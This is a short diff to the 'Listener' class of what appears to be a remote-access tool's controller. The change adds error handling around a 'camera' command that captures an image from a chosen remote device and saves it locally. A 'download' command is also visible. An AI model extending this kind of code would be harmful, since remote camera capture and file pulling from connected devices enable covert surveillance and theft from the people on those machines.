@@ -143,7 +143,10 @@ class Listener:
 			elif command == "camera":
 				if self.chosen_connection:
 					res = self.execute_remotely("camera")
-					self.write_file("one.jpg", res)
+					if res.split()[0] == "[-]":
+						print(colored(res, "red"))
+					else:
+						self.write_file("one.jpg", res)
 				else: print(colored("[~] You have to choose one device", "yellow"))
 			
 			elif command.strip() and command.split()[0] == "download":
